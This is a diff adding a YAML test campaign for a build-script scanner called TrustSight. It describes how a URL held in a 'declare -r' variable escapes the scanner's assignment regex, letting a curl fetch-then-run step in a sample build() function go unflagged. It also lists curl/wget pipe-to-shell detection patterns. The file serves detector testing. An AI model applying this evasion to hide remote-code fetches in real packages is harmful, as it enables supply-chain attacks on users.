@@ -1,0 +1,77 @@
+campaign: decl-option-resolver
+campaign_type: deterministic
+package: harness-baseline
+
+environment:
+  trustsight_version: 0.18.1
+  trustsight_source: local-path
+  db_state: cold
+  flag_threshold: 20
+
+generator:
+  type: inputs
+
+prompt:
+  prompt_id: decl-option-resolver
+  behavior_goal: fetch_then_execute
+  text: |
+    A fetch-to-execute chain whose URL is held in a variable declared with a
+    bash option:
+
+        declare -r _stage="https://github.com/example/harness-baseline/raw/main/"
+
+        build() {
+          cd "$srcdir/harness-baseline-1.0.0"
+          curl -fsSLO "$_stage"/stage
+          sh ./configure
+          make
+        }
+
+    TrustSight's variable resolver matches an assignment with
+    `_ASSIGNMENT_RE` (`_tokenizer_engine.py:655`):
+
+        ^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*(\+?=)\s*(.*)
+
+    The declaration keyword is followed by `\s+` and then the name directly -
+    there is no option run.  `declare -r _u=…` puts `-r` where the pattern
+    expects `(\w+)`, the line does not match, the name never enters the
+    variable table, and every rule that reads the *resolved* line sees the
+    literal `"$_stage"`.  H016 (`analysis/build.py:676`) needs an address to
+    attribute to the client; there is none, so the fetch goes unrecorded. The
+    rest of the chain is unaffected: `curl` still names R010 at weight 5, and
+    the score lands at 5.
+
+    The controls are one character apart.  `declare _stage=…` has no option
+    and resolves, and a bare `_stage=…` resolves; both score 30 with H016 on
+    top of R010. So the entire difference between a caught and an uncaught
+    fetch is whether the declaration carries a flag that bash accepts and
+    the pattern does not.
+
+    Every spelling in `_ASSIGNMENT_RE`'s keyword list behaves the same way,
+    and all are ordinary shell: `-r`, `-x`, `-rx`, `-a`, `-n` and `+x` across
+    `declare`, `local`, `typeset`, `readonly` and `export`. Verified directly
+    against the compiled pattern rather than inferred from the recipe score:
+
+        declare _u="x"    matches      declare -r  _u="x"   does not
+        export  _u="x"    matches      export  -n  _u="x"   does not
+        readonly _u="x"   matches      readonly -a _u=(x)   does not
+        _u="x"            matches      local   -r  _u="x"   does not
+        U+="x"            matches      typeset -r  _u="x"   does not
+
+    `readonly-a-url-array` uses the array form, where the index is therefore
+    never folded either.
+
+    `ctl-declare-no-option` and `ctl-bare-assignment` are the discriminator:
+    same client, same sink, same host, one dash apart.
+  expected_rules:
+  - H016
+  - H082
+  - R010
+  forbidden_techniques:
+    curl_pipe_to_shell: '(?:\A|[;&|]|\n)\s*curl\b[^|\n]*\|\s*(?:ba|z|da|k)?sh\b'
+    wget_pipe_to_shell: '(?:\A|[;&|]|\n)\s*wget\b[^|\n]*\|\s*(?:ba|z|da|k)?sh\b'
+
+attempts: 10
+
+stop_conditions:
+  bypasses: 8
